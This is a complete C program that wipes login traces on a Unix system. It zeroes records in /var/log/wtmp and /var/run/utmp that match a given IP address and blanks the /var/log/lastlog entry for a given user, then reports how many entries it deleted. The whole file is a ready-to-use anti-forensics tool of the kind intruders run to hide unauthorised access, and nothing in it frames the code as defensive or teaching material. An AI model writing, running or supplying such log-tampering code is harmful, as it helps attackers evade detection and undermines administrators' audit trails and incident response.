#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <utmp.h>
#include <pwd.h>

#define WTMP "/var/log/wtmp"
#define UTMP "/var/run/utmp"
#define LASTLOG "/var/log/lastlog"


int cleanWtmp(char host[])
{
	struct utmp utmp_ent;
	int fd, count=0;

	if((fd=open(WTMP,O_RDWR))>=0)
	{
		//lseek(fd,0,SEEK_SET);
		while(read(fd,&utmp_ent,sizeof(utmp_ent)))
		{
			if(!strncmp(utmp_ent.ut_host,host,strlen(host)))
			{
				bzero((char *)&utmp_ent,sizeof(utmp_ent));
				lseek(fd,-(sizeof(utmp_ent)),SEEK_CUR);
				write(fd,&utmp_ent,sizeof(utmp_ent));
				count++;
			}
		}
		close(fd);
		return count;
	}
	else 
		return -1;
}// end cleanWtmp 



int cleanUtmp(char *host)
{
	struct utmp utmp_ent;
	int fd, count=0;

	if((fd=open(UTMP,O_RDWR))>=0)
	{
		//lseek(fd,0,SEEK_SET);
		while(read(fd,&utmp_ent,sizeof(utmp_ent)))
		{
			if(!strncmp(utmp_ent.ut_host,host,strlen(host)))
			{
				bzero((char *)&utmp_ent,sizeof(utmp_ent));
				lseek(fd,-(sizeof(utmp_ent)),SEEK_CUR);
				write(fd,&utmp_ent,sizeof(utmp_ent));
				count++;
			}
		}
		close(fd);
		return count;
	}
	else 
		return -1;
}// end cleanUtmp 



int cleanLastlog(char *account)
{
	struct passwd *pwd;
	struct lastlog logit;
	int f;

	if((pwd=getpwnam(account)))
	{
		if((f=open(LASTLOG,O_RDWR))>=0)
		{
			lseek(f,(long)pwd->pw_uid*sizeof(struct lastlog),0);
			bzero((char *)&logit,sizeof(logit));
			write(f,(char *)&logit,sizeof(logit));
			close(f);
		}
		return 0;
	}
	else 
		return 1;
}// end cleanLastlog 




int main(int argc, char *argv[])
{
	int flag;

	if (argc!=3)
	{
		printf("Usage\n");
		printf("\t%s <user> <ip>\n",argv[0]);
		printf("<user>:\tfor lastlog\n");
		printf("<ip>:\tfor utmp and wtmp\n\n");
		return 0;
	}
	

	if ((flag=cleanWtmp(argv[2]))!=-1)
		printf("wtmp:\tok\t(%d deleted)\n", flag);
	else
		printf("wtmp:\terror\t(0 deleted)\n");


	if ((flag=cleanUtmp(argv[2]))!=-1)
		printf("utmp:\tok\t(%d deleted)\n", flag);
	else
		printf("utmp:\terror\t(0 deleted)\n");


	if (cleanLastlog(argv[1])!=-1)
		printf("lastlog:\tok\n");
	else
		printf("lastlog:\terror\n");

	return 0;
}
